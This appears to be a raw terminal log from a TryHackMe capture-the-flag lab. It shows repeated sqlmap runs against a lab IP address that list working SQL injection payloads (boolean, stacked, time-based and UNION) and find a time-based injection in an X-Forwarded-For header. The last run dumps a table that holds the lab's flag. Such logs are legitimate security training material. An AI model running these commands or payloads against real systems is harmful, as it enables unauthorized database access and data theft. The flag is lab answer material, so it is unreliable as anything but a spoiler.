+└─# sqlmap -u "http://10.10.96.42/user?id=1" --headers="X-forwarded-for:1*" --risk=3 --level=5 --dbms=mysql --threads 10 --dbs --time-sec=1
+        ___
+       __H__                                                                                                                         
+ ___ ___[)]_____ ___ ___  {1.6.7#stable}                                                                                             
+|_ -| . [)]     | .'| . |                                                                                                            
+|___|_  [,]_|_|_|__,|  _|                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                         
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:21:45 /2023-04-30/
+
+custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] n
+[11:21:46] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 5443=5443
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: id=1;SELECT SLEEP(1)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 4360 FROM (SELECT(SLEEP(1)))GyzQ)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-2460 UNION ALL SELECT CONCAT(0x7176716a71,0x456c6865736556654477734b624d4a76614d66586a556d445369515a4b4b4d58794c724379674572,0x7178787a71),NULL,NULL-- -
+---
+[11:21:47] [INFO] testing MySQL
+[11:21:47] [INFO] confirming MySQL
+[11:21:47] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 8.0.0
+[11:21:47] [INFO] fetching database names
+available databases [2]:
+[*] information_schema
+[*] sqhell_4
+
+[11:21:47] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.96.42'
+[11:21:47] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 11:21:47 /2023-04-30/
+
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u "http://10.10.96.42/user?id=1" --headers="X-forwarded-for:1*" --risk=3 --level=5 --dbms=mysql --threads 10 --dbs --time┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u "http://10.10.96.42/user?id=1" --headers="X-forwarded-for:1*" --risk=3 --level=5 --dbms=mysql --threads 10 --dbs --time-sec=1
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.6.7#stable}
+|_ -| . ["]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:23:24 /2023-04-30/
+
+custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] 
+[11:23:25] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 5443=5443
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: id=1;SELECT SLEEP(1)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 4360 FROM (SELECT(SLEEP(1)))GyzQ)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-2460 UNION ALL SELECT CONCAT(0x7176716a71,0x456c6865736556654477734b624d4a76614d66586a556d445369515a4b4b4d58794c724379674572,0x7178787a71),NULL,NULL-- -
+---
+[11:23:25] [INFO] testing MySQL
+[11:23:25] [INFO] confirming MySQL
+[11:23:25] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 8.0.0
+[11:23:25] [INFO] fetching database names
+available databases [2]:
+[*] information_schema
+[*] sqhell_4
+
+[11:23:25] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.96.42'
+[11:23:25] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 11:23:25 /2023-04-30/
+
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u "http://10.10.96.42/user?id=1" --headers="X-forwarded-for:1*" -p "id" --risk=3 --level=5 --dbms=mysql --threads 10 --dbs --time-sec=1
+        ___
+       __H__                                                                                                                         
+ ___ ___[.]_____ ___ ___  {1.6.7#stable}                                                                                             
+|_ -| . [)]     | .'| . |                                                                                                            
+|___|_  [']_|_|_|__,|  _|                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                         
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:23:59 /2023-04-30/
+
+custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
+[11:24:02] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 5443=5443
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: id=1;SELECT SLEEP(1)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 4360 FROM (SELECT(SLEEP(1)))GyzQ)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-2460 UNION ALL SELECT CONCAT(0x7176716a71,0x456c6865736556654477734b624d4a76614d66586a556d445369515a4b4b4d58794c724379674572,0x7178787a71),NULL,NULL-- -
+---
+[11:24:02] [INFO] testing MySQL
+[11:24:02] [INFO] confirming MySQL
+[11:24:02] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 8.0.0
+[11:24:02] [INFO] fetching database names
+available databases [2]:
+[*] information_schema
+[*] sqhell_4
+
+[11:24:02] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.96.42'
+[11:24:02] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 11:24:02 /2023-04-30/
+
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u "http://10.10.96.42/user?id=1" --headers="X-forwarded-for:1*" --risk=3 --level=5 --dbms=mysql --threads 10 -D sqhell_1 --tables --dump-all --time-sec=1
+        ___
+       __H__                                                                                                                         
+ ___ ___[.]_____ ___ ___  {1.6.7#stable}                                                                                             
+|_ -| . [']     | .'| . |                                                                                                            
+|___|_  [)]_|_|_|__,|  _|                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                         
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:24:32 /2023-04-30/
+
+custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] 
+[11:24:42] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 5443=5443
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: id=1;SELECT SLEEP(1)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 4360 FROM (SELECT(SLEEP(1)))GyzQ)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-2460 UNION ALL SELECT CONCAT(0x7176716a71,0x456c6865736556654477734b624d4a76614d66586a556d445369515a4b4b4d58794c724379674572,0x7178787a71),NULL,NULL-- -
+---
+[11:24:42] [INFO] testing MySQL
+[11:24:42] [INFO] confirming MySQL
+[11:24:42] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 8.0.0
+[11:24:42] [INFO] fetching tables for database: 'sqhell_1'
+[11:24:43] [WARNING] the SQL query provided does not return any output
+[11:24:43] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[11:24:43] [INFO] fetching number of tables for database 'sqhell_1'
+[11:24:43] [INFO] retrieved: 0
+[11:24:44] [WARNING] database 'sqhell_1' appears to be empty
+[11:24:44] [ERROR] unable to retrieve the table names for any database
+do you want to use common table existence check? [y/N/q] 
+No tables found
+[11:24:46] [INFO] fetching tables for database: 'sqhell_1'
+[11:24:47] [WARNING] the SQL query provided does not return any output
+[11:24:47] [INFO] fetching number of tables for database 'sqhell_1'
+[11:24:47] [INFO] resumed: 0
+[11:24:47] [WARNING] database 'sqhell_1' appears to be empty
+[11:24:47] [ERROR] unable to retrieve the table names for any database
+do you want to use common table existence check? [y/N/q] 
+[11:24:48] [CRITICAL] unable to retrieve the tables in database 'sqhell_1'
+[11:24:48] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.96.42'
+[11:24:48] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 11:24:48 /2023-04-30/
+
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u "http://10.10.96.42/user?id=1" --headers="X-forwarded-for:1*" --risk=3 --level=5 --dbms=mysql --threads 10 -D sqhell_1 --tables --dump-all --time-sec=1
+        ___
+       __H__                                                                                                                         
+ ___ ___["]_____ ___ ___  {1.6.7#stable}                                                                                             
+|_ -| . [(]     | .'| . |                                                                                                            
+|___|_  [,]_|_|_|__,|  _|                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                         
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:24:53 /2023-04-30/
+
+custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] 
+[11:24:54] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 5443=5443
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: id=1;SELECT SLEEP(1)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 4360 FROM (SELECT(SLEEP(1)))GyzQ)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-2460 UNION ALL SELECT CONCAT(0x7176716a71,0x456c6865736556654477734b624d4a76614d66586a556d445369515a4b4b4d58794c724379674572,0x7178787a71),NULL,NULL-- -
+---
+[11:24:55] [INFO] testing MySQL
+[11:24:55] [INFO] confirming MySQL
+[11:24:55] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 8.0.0
+[11:24:55] [INFO] fetching tables for database: 'sqhell_1'
+[11:24:55] [WARNING] the SQL query provided does not return any output
+[11:24:55] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[11:24:55] [INFO] fetching number of tables for database 'sqhell_1'
+[11:24:55] [INFO] resumed: 0
+[11:24:55] [WARNING] database 'sqhell_1' appears to be empty
+[11:24:55] [ERROR] unable to retrieve the table names for any database
+do you want to use common table existence check? [y/N/q] y
+which common tables (wordlist) file do you want to use?
+[1] default '/usr/share/sqlmap/data/txt/common-tables.txt' (press Enter)
+[2] custom
+> 
+[11:24:59] [INFO] performing table existence using items from '/usr/share/sqlmap/data/txt/common-tables.txt'
+[11:24:59] [INFO] adding words used on web page to the check list
+[11:24:59] [INFO] checking database 'sqhell_1'
+[11:24:59] [INFO] starting 10 threads
+[11:25:02] [INFO] tried 15/3451 items (0%)
+[11:25:03] [INFO] tried 18/3451 items (1%)
+[11:25:03] [INFO] tried 19/3451 items (1%)
+[11:25:04] [INFO] tried 20/3451 items (1%)
+
+[11:25:04] [INFO] tried 21/3451 items (1%)
+[11:25:05] [INFO] tried 22/3451 items (1%)
+
+[11:25:05] [INFO] tried 23/3451 items (1%)
+
+
+
+
+
+
+
+
+
+
+[11:25:28] [INFO] tried 82/3451 items (2%)^Z
+zsh: suspended  sqlmap -u "http://10.10.96.42/user?id=1" --headers="X-forwarded-for:1*"     1
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u "http://10.10.96.42/user?id=1" --headers="X-forwarded-for:1*" --risk=3 --level=5 --dbms=mysql --threads 10 -D sqhell_1 --tables --dump-all --time-sec=1
+        ___
+       __H__                                                                                                                         
+ ___ ___["]_____ ___ ___  {1.6.7#stable}                                                                                             
+|_ -| . [.]     | .'| . |                                                                                                            
+|___|_  [.]_|_|_|__,|  _|                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                         
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:25:31 /2023-04-30/
+
+custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
+[11:25:33] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 5443=5443
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: id=1;SELECT SLEEP(1)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 4360 FROM (SELECT(SLEEP(1)))GyzQ)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-2460 UNION ALL SELECT CONCAT(0x7176716a71,0x456c6865736556654477734b624d4a76614d66586a556d445369515a4b4b4d58794c724379674572,0x7178787a71),NULL,NULL-- -
+---
+[11:25:34] [INFO] testing MySQL
+[11:25:34] [INFO] confirming MySQL
+[11:25:34] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 8.0.0
+[11:25:34] [INFO] fetching tables for database: 'sqhell_1'
+[11:25:35] [WARNING] the SQL query provided does not return any output
+[11:25:35] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[11:25:35] [INFO] fetching number of tables for database 'sqhell_1'
+[11:25:35] [INFO] resumed: 0
+[11:25:35] [WARNING] database 'sqhell_1' appears to be empty
+[11:25:35] [ERROR] unable to retrieve the table names for any database
+do you want to use common table existence check? [y/N/q] N
+No tables found
+[11:25:39] [INFO] fetching tables for database: 'sqhell_1'
+[11:25:40] [WARNING] the SQL query provided does not return any output
+[11:25:40] [INFO] fetching number of tables for database 'sqhell_1'
+[11:25:40] [INFO] resumed: 0
+[11:25:40] [WARNING] database 'sqhell_1' appears to be empty
+[11:25:40] [ERROR] unable to retrieve the table names for any database
+do you want to use common table existence check? [y/N/q] y
+which common tables (wordlist) file do you want to use?
+[1] default '/usr/share/sqlmap/data/txt/common-tables.txt' (press Enter)
+[2] custom
+> 
+[11:25:50] [INFO] performing table existence using items from '/usr/share/sqlmap/data/txt/common-tables.txt'
+[11:25:50] [INFO] adding words used on web page to the check list
+[11:25:50] [INFO] checking database 'sqhell_1'
+[11:25:50] [INFO] starting 10 threads
+[11:26:54] [INFO] tried 165/3451 items (5%)^Z
+zsh: suspended  sqlmap -u "http://10.10.96.42/user?id=1" --headers="X-forwarded-for:1*"     1
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap --dbms mysql --headers="X-forwarded-for:1*" -u http://10.10.96.42/ -D sqhell_1 -T flag --dump
+        ___
+       __H__                                                                                                                         
+ ___ ___[']_____ ___ ___  {1.6.7#stable}                                                                                             
+|_ -| . [,]     | .'| . |                                                                                                            
+|___|_  [(]_|_|_|__,|  _|                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                         
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:27:06 /2023-04-30/
+
+custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
+[11:27:09] [INFO] testing connection to the target URL
+[11:27:10] [INFO] checking if the target is protected by some kind of WAF/IPS
+[11:27:10] [INFO] testing if the target URL content is stable
+[11:27:10] [INFO] target URL content is stable
+[11:27:10] [INFO] testing if (custom) HEADER parameter 'X-forwarded-for #1*' is dynamic
+[11:27:10] [WARNING] (custom) HEADER parameter 'X-forwarded-for #1*' does not appear to be dynamic
+[11:27:11] [WARNING] heuristic (basic) test shows that (custom) HEADER parameter 'X-forwarded-for #1*' might not be injectable
+[11:27:11] [INFO] testing for SQL injection on (custom) HEADER parameter 'X-forwarded-for #1*'
+[11:27:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[11:27:12] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[11:27:12] [INFO] testing 'Generic inline queries'
+[11:27:12] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[11:27:13] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[11:27:13] [WARNING] time-based comparison requires larger statistical model, please wait............... (done)                     
+[11:27:27] [INFO] (custom) HEADER parameter 'X-forwarded-for #1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[11:27:33] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[11:27:33] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[11:27:37] [INFO] checking if the injection point on (custom) HEADER parameter 'X-forwarded-for #1*' is a false positive
+(custom) HEADER parameter 'X-forwarded-for #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:
+---
+Parameter: X-forwarded-for #1* ((custom) HEADER)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: 1' AND (SELECT 2746 FROM (SELECT(SLEEP(5)))RBDQ) AND 'ZQuQ'='ZQuQ
+---
+[11:29:18] [INFO] the back-end DBMS is MySQL
+[11:29:18] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+[11:29:18] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 5.0.12
+[11:29:19] [INFO] fetching columns for table 'flag' in database 'sqhell_1'
+[11:29:19] [INFO] retrieved: 
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+2
+[11:29:37] [INFO] retrieved: 
+[11:29:42] [INFO] adjusting time delay to 2 seconds due to good response times
+flag
+[11:30:10] [INFO] retrieved: id
+[11:30:25] [INFO] fetching entries for table 'flag' in database 'sqhell_1'
+[11:30:25] [INFO] fetching number of entries for table 'flag' in database 'sqhell_1'
+[11:30:25] [INFO] retrieved: 1
+[11:30:28] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
+THM{FLAG2:C678ABFE1C01FCA19
+[11:34:10] [ERROR] invalid character detected. retrying..
+[11:34:10] [WARNING] increasing time delay to 3 seconds
+E03901CEDAB1D15}
+[11:36:59] [INFO] retrieved: 1
+Database: sqhell_1
+Table: flag
+[1 entry]
++----+---------------------------------------------+
+| id | flag                                        |
++----+---------------------------------------------+
+| 1  | THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15} |
++----+---------------------------------------------+
+
+[11:37:07] [INFO] table 'sqhell_1.flag' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.96.42/dump/sqhell_1/flag.csv'
+[11:37:07] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.96.42'
+[11:37:07] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 11:37:07 /2023-04-30/
+
